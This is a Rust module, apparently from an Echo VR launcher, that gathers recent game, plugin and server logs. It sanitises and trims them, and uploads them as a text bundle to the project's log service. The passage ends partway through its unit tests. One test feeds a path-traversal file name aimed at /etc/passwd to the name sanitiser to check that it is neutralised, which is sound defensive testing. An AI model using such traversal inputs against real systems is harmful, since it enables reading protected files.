//! What "Upload logs" sends: every log of the last two weeks there is: the launcher's own,
//! Echo VR's (each installed version's `_local/r14logs`), EchoXR's, nEVR's in every folder
//! it writes to ([`nevr::log_places`], [`nevr::bin_places`]: its starts, crash records and
//! reports, its host's and boot logs, its plugins'), the Server host's servers' (their
//! consoles and their own nEVR folders), and the Quest logs saved last. One plain-text
//! bundle (no archive, nothing to unpack), each file cut to its newest part and cleaned so
//! the upload service always takes a real log (it refuses anything that isn't plain text).
//!
//! The service says how many files and bytes it takes ([`limits`]; 24 files when it
//! doesn't say), and refuses a whole upload past that: the bundle never holds more. When
//! more is found, crash records and their starts' logs go first ([`Rank`]); the index the
//! bundle starts with ([`INDEX`]) names every log found, sent or not, and why.
//!
//! ```text
//! ECHOVR-LOGS 1
//! FILE launcher/upload-index.txt 2210
//! <exactly that many bytes>
//! FILE plugin/root.logs.nevr-crash-68c0-1dd68cae112e7c4.txt 885
//! <...>
//! END
//! ```

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use anyhow::{anyhow, Context, Result};

use super::launcher::nevr::{self, Place};
use super::launcher::store::InstalledVersion;
use super::paths;

/// Where the bundle goes (a GET there answers the [`Limits`]).
pub const UPLOAD_URL: &str = "https://release.echovr.de/launcher/logs";
/// The most of a file that goes (its newest part).
pub const MAX_FILE: usize = 8 << 20;
/// The longest line the service takes.
pub const MAX_LINE: usize = 16 << 10;
/// A run of base64 this long is left out (the service refuses one: that's how payloads,
/// and tokens, end up in text).
const MAX_BASE64_RUN: usize = 1024;
/// Logs older than this are named in the index, not sent.
const RECENT: Duration = Duration::from_secs(14 * 24 * 3600);
/// How deep a plugin's logs are looked for in a `plugin_logs` folder.
const DEPTH: usize = 4;

/// The launcher's own logs (its window's, Linux' PLAY through Steam, the administrator
/// helper's and the tray's), as `core::log` writes and rotates them, and Proton's output
/// of the last Linux start.
const LAUNCHER_LOGS: [&str; 9] = [
    "EchoVR_Launcher.log",
    "play.log",
    "admin-helper.log",
    "tray.log",
    "proton.log",
    // The rotated ones after the current ones: they go when the room is short.
    "EchoVR_Launcher.log.1",
    "play.log.1",
    "admin-helper.log.1",
    "tray.log.1",
];

/// The index's name in the bundle (in `launcher/`): every log found, sent or not.
pub const INDEX: &str = "upload-index.txt";
/// The room the index keeps in the budget (its newest part goes, should it be longer).
const INDEX_MAX: usize = 1 << 20;
/// What the index names of the logs not sent for their age or kind, at most (the newest).
const INDEX_SKIPPED: usize = 400;

/// What the log upload service takes in one upload.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Limits {
    pub max_files: usize,
    pub max_body: usize,
    pub max_file: usize,
}

impl Limits {
    /// A service that doesn't say (before 2026-10-31, or when it can't be asked): what it
    /// took then.
    pub const FALLBACK: Limits = Limits {
        max_files: 24,
        max_body: 34 << 20,
        max_file: 8 << 20,
    };

    /// Pure: the service's answer, when it's a sane one.
    fn from_json(v: &serde_json::Value) -> Option<Limits> {
        let n = |k: &str| v.get(k)?.as_u64().map(|n| n as usize);
        let l = Limits {
            max_files: n("max_files")?,
            max_body: n("max_body")?,
            max_file: n("max_file")?,
        };
        let sane = (2..=4096).contains(&l.max_files)
            && (1 << 20..=1 << 30).contains(&l.max_body)
            && (64 << 10..=l.max_body).contains(&l.max_file);
        sane.then_some(l)
    }

    /// What the files' text may take: the body less the framing (a line per file).
    fn budget(&self) -> usize {
        self.max_body.saturating_sub(self.max_files * 160 + 4096)
    }
}

/// What the service takes, as it says (a GET on [`UPLOAD_URL`]); [`Limits::FALLBACK`] when
/// it doesn't (an older service, or none reached).
pub fn limits() -> Limits {
    let url = upload_url();
    let answer = super::http::block_on(async {
        let resp = super::http::client()
            .get(&url)
            .timeout(Duration::from_secs(15))
            .send()
            .await
            .ok()?;
        if !resp.status().is_success() {
            return None;
        }
        serde_json::from_str::<serde_json::Value>(&resp.text().await.ok()?).ok()
    });
    match answer.as_ref().and_then(Limits::from_json) {
        Some(l) => l,
        None => {
            tracing::info!("logs: the upload service didn't say its limits, keeping to 24 files");
            Limits::FALLBACK
        }
    }
}

/// Where a log is from (its folder in the bundle).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Kind {
    Launcher,
    EchoXr,
    Echo,
    Plugin,
    Quest,
}

impl Kind {
    pub const ALL: [Kind; 5] = [
        Kind::Launcher,
        Kind::EchoXr,
        Kind::Echo,
        Kind::Plugin,
        Kind::Quest,
    ];

    fn dir(self) -> &'static str {
        match self {
            Kind::Launcher => "launcher",
            Kind::EchoXr => "echoxr",
            Kind::Echo => "echo",
            Kind::Plugin => "plugin",
            Kind::Quest => "quest",
        }
    }

    /// Its row in the upload card.
    pub fn title(self) -> &'static str {
        match self {
            Kind::Launcher => "Launcher",
            Kind::EchoXr => "EchoXR",
            Kind::Echo => "Echo VR",
            Kind::Plugin => "nEVR and plugins",
            Kind::Quest => "Quest",
        }
    }

    /// Whose logs, in a sentence.
    pub fn label(self) -> &'static str {
        match self {
            Kind::Launcher => "the launcher",
            Kind::EchoXr => "EchoXR",
            Kind::Echo => "Echo VR",
            Kind::Plugin => "nEVR and its plugins",
            Kind::Quest => "your Quest",
        }
    }
}

/// Which logs go first when the service takes fewer than were found.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord)]
pub enum Rank {
    /// A crash record or report, and the log of the start it is of.
    Crash,
    /// The launcher's current logs, nEVR's host and boot logs.
    Key,
    /// The newest log of each folder.
    Newest,
    #[default]
    Rest,
}

/// One log to send.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Source {
    pub kind: Kind,
    /// Its name in the bundle: `[A-Za-z0-9._-]`, at most 100 characters, unique.
    pub name: String,
    pub path: PathBuf,
    /// How much of it goes at most (its newest part, at most `MAX_FILE`).
    pub bytes: u64,
    pub modified: SystemTime,
    pub rank: Rank,
    /// The start it is of, for a crash record or report and the log of a start that crashed.
    pub run: Option<String>,
}

/// A log found and not sent for its age or kind: the index names it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Skipped {
    pub kind: Kind,
    pub name: String,
    pub bytes: u64,
    pub modified: SystemTime,
    pub why: &'static str,
}

/// Every log found: those to send, and those named only.
#[derive(Debug, Clone, Default)]
pub struct Found {
    pub sources: Vec<Source>,
    pub skipped: Vec<Skipped>,
}

/// Pure: a file name as the service takes it.
pub fn bundle_name(name: &str) -> String {
    let clean: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect();
    // Keep the end (the extension) when it's too long.
    let start = clean.len().saturating_sub(100);
    let clean = &clean[start..];
    if clean.is_empty() || clean.chars().all(|c| c == '.') {
        "log".into()
    } else {
        clean.to_string()
    }
}

/// The non-empty files in `dir` whose names pass `keep`, newest first. Size and time come
/// from each file itself: on Windows the folder's listing keeps a file's size (0 for a new
/// one) until it is closed, so a running game's log would look empty.
pub(crate) fn newest_in(dir: &Path, keep: impl Fn(&str) -> bool) -> Vec<(PathBuf, SystemTime)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<(PathBuf, SystemTime)> = entries
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .filter(|e| keep(&e.file_name().to_string_lossy()))
        .filter_map(|e| {
            let m = std::fs::metadata(e.path()).ok()?;
            (m.len() > 0).then_some((e.path(), m.modified().ok()?))
        })
        .collect();
    files.sort_by_key(|f| std::cmp::Reverse(f.1));
    files
}

/// Pure: whether `name` is a log (or a crash dump, to be named): a `.log`, `.txt` or
/// `.jsonl`, nEVR's sent or refused crash reports, a `.dmp`. Never a sign-in or its
/// install id.
fn is_log(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    !n.starts_with('.')
        && n != "install-id.txt"
        // nEVR 5.13's note where its logs were (a path, not a log).
        && n != "moved-to-nevr-root.txt"
        && [
            ".log",
            ".txt",
            ".jsonl",
            ".report.txt.sent",
            ".report.txt.rejected",
            ".dmp",
        ]
        .iter()
        .any(|e| n.ends_with(e))
}

/// Pure: how a time reads in the index, `2026-10-31T00:01:25Z` (as a log line starts).
fn utc(t: SystemTime) -> String {
    time::OffsetDateTime::from(t)
        .replace_nanosecond(0)
        .ok()
        .and_then(|t| {
            t.format(&time::format_description::well_known::Rfc3339)
                .ok()
        })
        .unwrap_or_else(|| "1970-01-01T00:00:00Z".into())
}

/// Pure: a size in words, "885 bytes", "80.3 KB", "8.0 MB".
fn size(n: u64) -> String {
    match n {
        0..1000 => format!("{n} bytes"),
        1000..1_000_000 => format!("{:.1} KB", n as f64 / 1000.0),
        _ => format!("{:.1} MB", n as f64 / 1_000_000.0),
    }
}

/// Finds the logs: each one once (a folder can be found by two ways), named uniquely.
struct Collector {
    now: SystemTime,
    found: Found,
    seen: HashSet<PathBuf>,
    names: HashSet<String>,
}

impl Collector {
    fn new(now: SystemTime) -> Self {
        Collector {
            now,
            found: Found::default(),
            seen: HashSet::new(),
            names: HashSet::new(),
        }
    }

    fn recent(&self, t: SystemTime) -> bool {
        self.now.duration_since(t).map_or(true, |age| age <= RECENT)
    }

    /// `name`, or a numbered one when another log has it.
    fn unique(&mut self, name: &str) -> String {
        let base = bundle_name(name);
        let mut name = base.clone();
        let mut i = 2;
        while !self.names.insert(name.clone()) {
            name = format!("{i}-{}", &base[base.len().saturating_sub(95)..]);
            i += 1;
        }
        name
    }

    /// A log found at `path`: sent when it's of the last two weeks (`always`: whatever its
    /// age), else named in the index. A crash dump is only named.
    fn file(&mut self, kind: Kind, name: &str, path: PathBuf, always: bool) {
        let Ok(m) = std::fs::metadata(&path) else {
            return;
        };
        if !m.is_file() || m.len() == 0 {
            return;
        }
        let key = std::fs::canonicalize(&path).unwrap_or_else(|_| path.clone());
        if !self.seen.insert(key) {
            return;
        }
        let modified = m.modified().unwrap_or(self.now);
        let why = if name.to_ascii_lowercase().ends_with(".dmp") {
            Some("a crash dump, never sent (it can hold sign-in tokens and chat)")
        } else if !always && !self.recent(modified) {
            Some("older than 14 days")
        } else {
            None
        };
        if let Some(why) = why {
            self.found.skipped.push(Skipped {
                kind,
                name: bundle_name(name),
                bytes: m.len(),
                modified,
                why,
            });
            return;
        }
        let name = self.unique(name);
        self.found.sources.push(Source {
            kind,
            name,
            bytes: m.len().min(MAX_FILE as u64),
            path,
            modified,
            rank: Rank::Rest,
            run: None,
        });
    }

    /// The logs in `dir` whose names pass `keep`, named `<label>.<path in dir>` (in its
    /// subfolders too when `deep`).
    fn dir(
        &mut self,
        kind: Kind,
        label: &str,
        dir: &Path,
        deep: bool,
        keep: &dyn Fn(&str) -> bool,
    ) {
        self.walk(kind, label, dir, if deep { DEPTH } else { 0 }, keep);
    }

    fn walk(
        &mut self,
        kind: Kind,
        label: &str,
        dir: &Path,
        depth: usize,
        keep: &dyn Fn(&str) -> bool,
    ) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        let mut entries: Vec<_> = entries.filter_map(Result::ok).collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let name = e.file_name().to_string_lossy().into_owned();
            // Links aren't followed (a server's game folder links into the game's).
            let Ok(t) = e.file_type() else { continue };
            if t.is_dir() && depth > 0 && !name.starts_with('.') {
                self.walk(kind, &format!("{label}.{name}"), &e.path(), depth - 1, keep);
            } else if t.is_file() && keep(&name) {
                self.file(kind, &format!("{label}.{name}"), e.path(), false);
            }
        }
    }

    /// nEVR's folders.
    fn places(&mut self, places: &[Place]) {
        for p in places {
            self.dir(Kind::Plugin, &p.label, &p.dir, p.deep, &is_log);
        }
    }

    /// What goes first: crash records and reports with their starts' logs, the launcher's
    /// current logs and nEVR's host and boot logs, then each folder's newest.
    fn rank(&mut self) {
        let file = |s: &Source| {
            s.path
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned()
        };
        let crashed: HashSet<String> = self
            .found
            .sources
            .iter()
            .filter_map(|s| nevr::crash_run(&file(s)))
            .collect();
        let mut newest: HashMap<(Kind, PathBuf), SystemTime> = HashMap::new();
        for s in &self.found.sources {
            let folder = s.path.parent().unwrap_or(Path::new("")).to_path_buf();
            let t = newest.entry((s.kind, folder)).or_insert(s.modified);
            *t = (*t).max(s.modified);
        }
        for s in &mut self.found.sources {
            let f = file(s);
            s.run = nevr::crash_run(&f).or_else(|| {
                (!crashed.is_empty() && nevr::is_run_log(&f))
                    .then(|| nevr::run_of(&s.path))
                    .flatten()
                    .filter(|r| crashed.contains(r))
            });
            let crash = s.run.is_some()
                || (f.starts_with("nevr-host-") && f.contains(".report.txt"))
                || nevr::is_host_fallback(&f);
            let key = (s.kind == Kind::Launcher && LAUNCHER_LOGS[..5].contains(&f.as_str()))
                || f == nevr::HOST_LOG
                || f == "nevr-boot.jsonl";
            let folder = s.path.parent().unwrap_or(Path::new("")).to_path_buf();
            s.rank = if crash {
                Rank::Crash
            } else if key {
                Rank::Key
            } else if newest.get(&(s.kind, folder)) == Some(&s.modified) {
                Rank::Newest
            } else {
                Rank::Rest
            };
        }
        self.found
            .sources
            .sort_by_key(|s| (s.rank, std::cmp::Reverse(s.modified)));
    }
}

/// A game server of the Server host: its name and folder.
struct ServerLogs {
    name: String,
    dir: PathBuf,
}

/// Every log there is: from the launcher's log folder `log_dir`, nEVR's folders `places`
/// (this computer's and each server's own), the installed `versions` (Echo VR's, EchoXR's,
/// nEVR's beside the game) and the Server host's `servers` (consoles, game folders).
fn collect_from(
    log_dir: &Path,
    places: &[Place],
    versions: &[InstalledVersion],
    servers: &[ServerLogs],
    now: SystemTime,
) -> Found {
    let mut c = Collector::new(now);
    // The launcher's own whatever their age: they say what it did last.
    for n in LAUNCHER_LOGS {
        c.file(Kind::Launcher, n, log_dir.join(n), true);
    }
    let present: Vec<&InstalledVersion> = versions.iter().filter(|v| v.present()).collect();
    for v in &present {
        let dir = v.bin_dir().join(super::echoxr::DIR);
        for n in ["launcher.log", "runtime.log", "platform.log"] {
            c.file(Kind::EchoXr, &format!("{}.{n}", v.id), dir.join(n), true);
        }
    }
    for v in &present {
        let r14 = Path::new(&v.root)
            .join(paths::ARENA_DIR)
            .join("_local/r14logs");
        c.dir(Kind::Echo, &v.id, &r14, false, &is_log);
    }
    c.places(places);
    for v in &present {
        let bin = v.bin_dir();
        c.places(&nevr::bin_places(&bin, &format!("{}.", v.id)));
        c.dir(Kind::Plugin, &v.id, &bin, false, &nevr::is_host_fallback);
    }
    for s in servers {
        let console = s.dir.join(crate::core::server_host::status::CONSOLE);
        c.file(
            Kind::Plugin,
            &format!("server-{}-console.log", s.name),
            console,
            false,
        );
        let root = crate::core::server_host::farm_root(&s.dir);
        let bin = crate::core::server_host::farm::bin_in(&root);
        let label = format!("server-{}", s.name);
        c.places(&nevr::bin_places(&bin, &format!("{label}.")));
        c.dir(Kind::Plugin, &label, &bin, false, &nevr::is_host_fallback);
        c.dir(
            Kind::Echo,
            &label,
            &root.join("_local/r14logs"),
            false,
            &is_log,
        );
    }
    // The Quest's logs as "Quest logs" saved them last (a folder each time).
    if let Some((dir, _)) = newest_in_dirs(&log_dir.join("quest")) {
        c.dir(Kind::Quest, "quest", &dir, true, &is_log);
    }
    c.rank();
    c.found
}

/// The newest folder in `dir`.
fn newest_in_dirs(dir: &Path) -> Option<(PathBuf, SystemTime)> {
    std::fs::read_dir(dir)
        .ok()?
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .filter_map(|e| Some((e.path(), modified(&e.path())?)))
        .max_by_key(|(_, t)| *t)
}

fn modified(path: &Path) -> Option<SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// Every log there is for these installed versions, the Server host's servers and nEVR's
/// folders on this computer (and each server's own).
pub fn collect(versions: &[InstalledVersion]) -> Found {
    let servers: Vec<ServerLogs> =
        std::fs::read_dir(crate::core::server_host::dir().join("servers"))
            .into_iter()
            .flatten()
            .flatten()
            .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
            .map(|e| ServerLogs {
                name: e.file_name().to_string_lossy().into_owned(),
                dir: e.path(),
            })
            .collect();
    let mut places = nevr::log_places();
    for s in &servers {
        if let Some(local) = crate::core::server_host::local_app_data(&s.name) {
            places.extend(nevr::log_places_in(
                &local,
                &nevr::temp_for(&local),
                &format!("server-{}.", s.name),
            ));
        }
    }
    collect_from(
        &paths::log_dir(),
        &places,
        versions,
        &servers,
        SystemTime::now(),
    )
}

/// Pure: `text`'s newest part of at most `max` bytes, starting at a character, and at a
/// line when there is one.
fn tail_str(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut start = text.len() - max;
    while !text.is_char_boundary(start) {
        start += 1;
    }
    let cut = &text[start..];
    match cut.find('\n') {
        Some(i) if i + 1 < cut.len() => &cut[i + 1..],
        _ => cut,
    }
}

/// Pure: `bytes`' newest part of at most `max` bytes, starting at a line.
fn tail(bytes: &[u8], max: usize) -> &[u8] {
    if bytes.len() <= max {
        return bytes;
    }
    let cut = &bytes[bytes.len() - max..];
    match cut.iter().position(|&b| b == b'\n') {
        Some(i) => &cut[i + 1..],
        None => cut,
    }
}

/// Pure: whether `c` stays in a cleaned log: printable ASCII, tab and newline, and any
/// letter or digit. Everything else non-ASCII (controls, format and bidi characters,
/// private use, line separators, symbols) becomes `?`, so the service's text rules never
/// refuse a real log.
fn keeps(c: char) -> bool {
    matches!(c, '\t' | '\n' | ' '..='~') || (!c.is_ascii() && c.is_alphanumeric())
}

/// Pure: `bytes` as clean text: invalid UTF-8 replaced, a CR without LF a line break,
/// characters `keeps` doesn't keep as `?`, long base64 runs left out, and lines over
/// `MAX_LINE` bytes broken.
pub fn sanitize(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let mut out = String::with_capacity(text.len());
    let mut run = String::new();
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        let c = match c {
            '\r' if chars.peek() == Some(&'\n') => '\r',
            '\r' => '\n',
            c if keeps(c) => c,
            _ => '?',
        };
        if c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=') {
            run.push(c);
            continue;
        }
        flush_run(&mut out, &mut run);
        out.push(c);
    }
    flush_run(&mut out, &mut run);
    // Dev codes keep a developer's folder private: never in an upload.
    break_lines(&crate::core::launcher::dev_code::redact(&out))
}

/// Appends a run of base64 characters, or a note in its place when it's long.
fn flush_run(out: &mut String, run: &mut String) {
    if run.len() >= MAX_BASE64_RUN {
        out.push_str(&format!("[{} base64 characters left out]", run.len()));
    } else {
        out.push_str(run);
    }
    run.clear();
}

/// Pure: `text` with every line longer than `MAX_LINE` bytes broken (at characters).
fn break_lines(text: &str) -> String {
    if text.split('\n').all(|l| l.len() <= MAX_LINE) {
        return text.to_string();
    }
    let mut out = String::with_capacity(text.len() + 64);
    for (i, l) in text.split('\n').enumerate() {
        if i > 0 {
            out.push('\n');
        }
        let mut n = 0;
        for c in l.chars() {
            if n + c.len_utf8() > MAX_LINE {
                out.push('\n');
                n = 0;
            }
            out.push(c);
            n += c.len_utf8();
        }
    }
    out
}

/// A bundle, and how many of the logs found it sends.
#[derive(Debug)]
pub struct Bundle {
    pub bytes: Vec<u8>,
    pub sent: usize,
    pub found: usize,
}

/// What happened to a log in a bundle (a line of the index).
enum Fate {
    /// What of it went, of how much, and whether only its newest part did.
    Sent(usize, u64, bool),
    OverFiles,
    OverBytes,
    Unread,
}

/// The bundle of `sources` within `limits`, the index ([`INDEX`]) first: at most
/// `max_files` files with the index, the first by [`Rank`] then the newest; each file's
/// newest part, cleaned. Over the byte budget the last of them are cut to their newest part
/// first (a crash's last). The index names every log found (`skipped` too) and what
/// became of it.
pub fn bundle(sources: &[Source], skipped: &[Skipped], limits: &Limits) -> Result<Bundle> {
    let mut order: Vec<&Source> = sources.iter().collect();
    order.sort_by_key(|s| (s.rank, std::cmp::Reverse(s.modified)));
    let over = order.split_off(limits.max_files.saturating_sub(1).min(order.len()));
    let per_file = limits.max_file.min(MAX_FILE);
    let len = |s: &Source| std::fs::metadata(&s.path).map_or(0, |m| m.len());
    let mut shares: Vec<usize> = order
        .iter()
        .map(|s| (len(s) as usize).min(per_file))
        .collect();
    let mut excess = shares
        .iter()
        .sum::<usize>()
        .saturating_sub(limits.budget().saturating_sub(INDEX_MAX));
    for share in shares.iter_mut().rev() {
        let cut = excess.min(*share);
        *share -= cut;
        excess -= cut;
    }
    let mut fates: Vec<(&Source, Fate)> = Vec::new();
    let mut texts: Vec<(&Source, String)> = Vec::new();
    for (s, &share) in order.iter().zip(&shares) {
        if share == 0 {
            fates.push((s, Fate::OverBytes));
            continue;
        }
        let Ok(bytes) = std::fs::read(&s.path) else {
            fates.push((s, Fate::Unread));
            continue;
        };
        // Cleaning can grow it (a note for a base64 run): cut again, at a character.
        let clean = sanitize(tail(&bytes, share));
        let text = tail_str(&clean, share).to_string();
        if text.is_empty() {
            fates.push((s, Fate::Unread));
            continue;
        }
        fates.push((
            s,
            Fate::Sent(text.len(), bytes.len() as u64, share < bytes.len()),
        ));
        texts.push((s, text));
    }
    fates.extend(over.into_iter().map(|s| (s, Fate::OverFiles)));
    let index = index(
        SystemTime::now(),
        limits,
        &fates,
        skipped,
        sources,
        texts.len(),
    );
    let mut out = b"ECHOVR-LOGS 1\n".to_vec();
    out.extend(format!("FILE {}/{INDEX} {}\n", Kind::Launcher.dir(), index.len()).as_bytes());
    out.extend(index.as_bytes());
    for (s, text) in &texts {
        out.extend(format!("FILE {}/{} {}\n", s.kind.dir(), s.name, text.len()).as_bytes());
        out.extend(text.as_bytes());
    }
    out.extend(b"END\n");
    Ok(Bundle {
        bytes: out,
        sent: texts.len(),
        found: sources.len() + skipped.len(),
    })
}

/// Pure: the index of a bundle: what it sends of the logs found, the crashes and their
/// starts' logs, then every log found and what became of it. Each line starts with a time,
/// as a log's do.
fn index(
    now: SystemTime,
    limits: &Limits,
    fates: &[(&Source, Fate)],
    skipped: &[Skipped],
    sources: &[Source],
    sent: usize,
) -> String {
    let now = utc(now);
    let mut lines = vec![format!(
        "{now} Upload index: {sent} of {} logs found are sent (the service takes {} files and {} at most). Every log found is named below.",
        sources.len() + skipped.len(),
        limits.max_files,
        size(limits.max_body as u64),
    )];
    let path = |s: &Source| format!("{}/{}", s.kind.dir(), s.name);
    let mut crashes: Vec<&Source> = sources
        .iter()
        .filter(|s| {
            s.run.is_some()
                && s.path
                    .file_name()
                    .is_some_and(|n| nevr::crash_run(&n.to_string_lossy()).is_some())
        })
        .collect();
    crashes.sort_by_key(|s| std::cmp::Reverse(s.modified));
    for c in crashes {
        let run = c.run.as_deref().unwrap_or_default();
        let start = sources.iter().find(|s| {
            s.run.as_deref() == Some(run)
                && s.path
                    .file_name()
                    .is_some_and(|n| nevr::is_run_log(&n.to_string_lossy()))
        });
        lines.push(format!(
            "{} Crash of start {run}: {}; the start's log: {}",
            utc(c.modified),
            path(c),
            start.map(path).unwrap_or_else(|| {
                "not found (nEVR deletes its oldest logs as they grow)".into()
            })
        ));
    }
    for (s, fate) in fates {
        let what = match fate {
            Fate::Sent(n, of, true) => {
                format!(
                    "trimmed  {} {} of {} (its newest part)",
                    path(s),
                    size(*n as u64),
                    size(*of)
                )
            }
            Fate::Sent(n, _, false) => format!("sent     {} {}", path(s), size(*n as u64)),
            Fate::OverFiles => format!(
                "left out {} {}: over the service's limit of {} files",
                path(s),
                size(s.bytes),
                limits.max_files
            ),
            Fate::OverBytes => format!(
                "left out {} {}: over the service's size limit",
                path(s),
                size(s.bytes)
            ),
            Fate::Unread => format!("left out {}: couldn't be read", path(s)),
        };
        lines.push(format!("{} {what}", utc(s.modified)));
    }
    let mut skipped: Vec<&Skipped> = skipped.iter().collect();
    skipped.sort_by_key(|s| std::cmp::Reverse(s.modified));
    for s in skipped.iter().take(INDEX_SKIPPED) {
        lines.push(format!(
            "{} not sent {}/{} {}: {}",
            utc(s.modified),
            s.kind.dir(),
            s.name,
            size(s.bytes),
            s.why
        ));
    }
    if skipped.len() > INDEX_SKIPPED {
        lines.push(format!(
            "{now} ... and {} older logs, not named",
            skipped.len() - INDEX_SKIPPED
        ));
    }
    let mut text = String::new();
    for l in lines {
        if text.len() + l.len() + 1 > INDEX_MAX {
            break;
        }
        text.push_str(&l);
        text.push('\n');
    }
    sanitize(text.as_bytes())
}

/// Where the bundle goes: debug builds may point elsewhere (`ECHOVR_LOG_UPLOAD_URL`) to
/// try a local service.
fn upload_url() -> String {
    if cfg!(debug_assertions) {
        if let Ok(url) = std::env::var("ECHOVR_LOG_UPLOAD_URL") {
            return url;
        }
    }
    UPLOAD_URL.into()
}

/// Pure: the last Echo VR account ("OVR-ORG-" and its number, the XPID) in a game log.
pub fn last_oid(text: &str) -> Option<String> {
    let mut found = None;
    let mut rest = text;
    while let Some(at) = rest.find("OVR-ORG-") {
        let digits: String = rest[at + 8..]
            .chars()
            .take_while(char::is_ascii_digit)
            .take(24)
            .collect();
        if digits.len() >= 3 {
            found = Some(format!("OVR-ORG-{digits}"));
        }
        rest = &rest[at + 8..];
    }
    found
}

/// The Echo VR account this PC played with last: the newest game log that names one.
pub fn find_oid(versions: &[InstalledVersion]) -> Option<String> {
    let mut logs: Vec<(PathBuf, SystemTime)> = versions
        .iter()
        .filter(|v| v.present())
        .flat_map(|v| {
            newest_in(
                &Path::new(&v.root)
                    .join(paths::ARENA_DIR)
                    .join("_local/r14logs"),
                is_log,
            )
        })
        .collect();
    logs.sort_by_key(|l| std::cmp::Reverse(l.1));
    logs.iter()
        .take(20)
        .find_map(|(p, _)| last_oid(&String::from_utf8_lossy(&std::fs::read(p).ok()?)))
}

/// Who uploads: the EchoVRCE session (the service reads the account's IDs with it, and
/// takes uploads only from signed-in players), and the Echo VR account of this PC.
pub struct Uploader {
    pub token: String,
    pub oid: Option<String>,
    /// A mod report ("Report this mod"): the mod (`id@version`) and what the player says
    /// happened. The moderators' post names it.
    pub report: Option<(String, String)>,
}

/// Sends `bundle`; the reference the service gives it, or what went wrong in plain words.
pub fn upload(bundle: Vec<u8>, who: &Uploader) -> Result<String> {
    let url = upload_url();
    let (status, body) = super::http::block_on(async {
        let mut req = super::http::client()
            .post(&url)
            // Sending, then the service's checks (its file type check takes a while).
            .timeout(Duration::from_secs(600))
            .header("Content-Type", "text/plain; charset=utf-8")
            .header("Authorization", format!("Bearer {}", who.token));
        if let Some(oid) = &who.oid {
            req = req.header("X-Echo-OID", oid);
        }
        if let Some((what, note)) = &who.report {
            let enc =
                |t: &str| url::form_urlencoded::byte_serialize(t.as_bytes()).collect::<String>();
            req = req.header("X-Report-Mod", enc(what));
            let note: String = note.chars().take(500).collect();
            req = req.header("X-Report-Note", enc(&note));
        }
        let resp = req
            .body(bundle)
            .send()
            .await
            .context("Couldn't reach the log upload service")?;
        let status = resp.status().as_u16();
        Ok::<_, anyhow::Error>((status, resp.text().await.unwrap_or_default()))
    })?;
    let json: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
    let field = |k: &str| json.get(k).and_then(|v| v.as_str()).map(str::to_string);
    match status {
        200 | 201 => field("code")
            .filter(|c| c.len() <= 32 && c.chars().all(|ch| ch.is_ascii_alphanumeric()))
            .ok_or_else(|| anyhow!("The log upload service answered without a reference.")),
        401 => Err(anyhow!(
            "EchoVRCE didn't accept your sign-in: sign in again on the EchoVRCE page, then upload again."
        )),
        429 => Err(anyhow!(
            "Too many uploads from your network: try again in an hour."
        )),
        413 => Err(anyhow!("The logs are too large for the upload service.")),
        503 => Err(anyhow!(
            "The log upload service is busy right now: try again in a few minutes."
        )),
        _ => Err(anyhow!(
            "The log upload service didn't take the logs ({status}){}",
            field("error")
                .filter(|e| e.len() < 200)
                .map(|e| format!(": {e}"))
                .unwrap_or_default()
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_the_last_echo_account() {
        let log = "[10-05-2026] [14:58:11]: [NSUSER] saved C:\\users\\steamuser\\AppData\\Local\\RAD\\EchoVR\\users\\OVR-ORG\\1\\clientprofile.json\n\
                   [10-05-2026] [15:00:22]: [NSUSER] Destroying user OVR-ORG-3963667097037078\n\
                   [10-05-2026] [15:00:22]: [LOGIN] Logging OVR-ORG-3963667097037079 out\n";
        assert_eq!(last_oid(log).as_deref(), Some("OVR-ORG-3963667097037079"));
        assert_eq!(last_oid("OVR-ORG\\1\\x OVR-ORG-12"), None);
        assert_eq!(last_oid(""), None);
    }

    #[test]
    fn names_files_safely() {
        assert_eq!(bundle_name("EchoVR_Launcher.log"), "EchoVR_Launcher.log");
        assert_eq!(
            bundle_name("[r14]-[10-03-2026]_[14-22-31]_1234.log"),
            "_r14_-_10-03-2026___14-22-31__1234.log"
        );
        assert_eq!(bundle_name("../../etc/passwd"), ".._.._etc_passwd");
        assert_eq!(bundle_name(".."), "log");
        assert_eq!(bundle_name(""), "log");
        let long = format!("{}.log", "a".repeat(200));
        assert_eq!(bundle_name(&long).len(), 100);
        assert!(bundle_name(&long).ends_with(".log"));
        // Two logs whose names end alike stay apart.
        let mut c = Collector::new(SystemTime::now());
        let a = c.unique(&format!("x{long}"));
        let b = c.unique(&format!("y{long}"));
        assert_ne!(a, b);
        assert!(b.len() <= 100 && b.ends_with(".log"), "{b}");
    }

    #[test]
    fn cleans_what_the_service_refuses() {
        // Escape sequences, bidi overrides, zero-width and private-use characters, NUL,
        // a bare CR and invalid UTF-8; letters stay.
        let dirty = "a\x1b[31mred\u{202E}x\u{200B}y\u{E000}\0z\rnext Jürgen 日本\n".as_bytes();
        let mut dirty = dirty.to_vec();
        dirty.extend(b"\xff\xfe end\r\n");
        let clean = sanitize(&dirty);
